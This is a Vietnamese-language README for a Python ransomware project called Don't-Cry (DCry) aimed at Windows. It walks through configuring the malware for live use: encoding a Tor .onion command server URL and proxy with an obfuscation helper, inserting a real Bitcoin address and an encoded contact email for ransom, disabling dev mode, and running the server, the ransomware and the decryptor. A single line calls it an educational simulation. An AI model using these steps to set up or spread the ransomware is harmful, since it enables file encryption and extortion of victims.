<h1 align="center">Don't-Cry Ransomware</h1>
  
<div align="center">

  <img src="https://img.shields.io/badge/Python-3.12%2B-blue?logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Requires-Cython-yellow?logo=python&logoColor=white" alt="Cython">
  <img src="https://img.shields.io/badge/Requires-Rust%20%3E%3D%201.87.0-orange?logo=rust&logoColor=white" alt="Rust >= 1.87.0">
  <img src="https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat&logo=open-source-initiative&logoColor=white" alt="License">
  <img src="https://img.shields.io/badge/Platform-Windows-blue" alt="Platform">
</div>

![DCry](https://raw.githubusercontent.com/memecoder12345678/DCry-Ransomware-PoC/main/imgs/DCry.png)
Ransomware viết bằng Python 💀💀💀
## Cách sử dụng
* Mở file [`DCry.py`](https://github.com/memecoder12345678/DCry-Ransomware-PoC/blob/main/src/DCry.py).
* Thay biến `YOUR_URL` bằng URL đã mã hóa sử dụng hàm `dx42` như sau:
  ```python
  YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
  ```
  (Trước đó dùng hàm `ex42` từ module `edx42` để mã hóa URL.)
  
  Ví dụ:
  ```python
  encoded_url = ex42(b"https://your-tor-server.onion")
  YOUR_URL = dx42(encoded_url).decode()
  ```
* Thay biến `YOUR_PROXY` tương tự với proxy đã mã hóa:
  ```python
  YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
  ```
* Thay `YOUR_BITCOIN_ADDRESS` bằng địa chỉ Bitcoin thật của bạn.
* Thay `YOUR_EMAIL_ADDRESS` tương tự bằng địa chỉ email đã mã hoá.
  ```python
  YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
  ```
* Đặt `dev_mode = False` để tắt chế độ phát triển.
* Mở file [`Decryptor.py`](https://github.com/memecoder12345678/DCry-Ransomware-PoC/blob/main/src/Decryptor.py).
* Đặt `dev_mode = False` để tắt chế độ phát triển.
* Cài đặt các thư viện cần thiết với lệnh:
  ```bash
  pip install -r requirements.txt
  ```
* Biên dịch mã Cython bằng lệnh:
  ```bash
  python src/setup.py build_ext --inplace
  ```
* Chạy server với lệnh:
  ```bash
  python src/Server.py
  ```
* Chạy ransomware với lệnh:
  ```bash
  python src/DCry.py
  ```
* Chạy công cụ giải mã với lệnh:
  ```bash
  python src/Decryptor.py
  ```
## Cảnh báo
> \[!WARNING]
> Dự án này là mô phỏng ransomware chỉ phục vụ mục đích giáo dục.
## Giấy phép
* Dự án này được cấp phép theo [Apache License 2.0](./LICENSE).
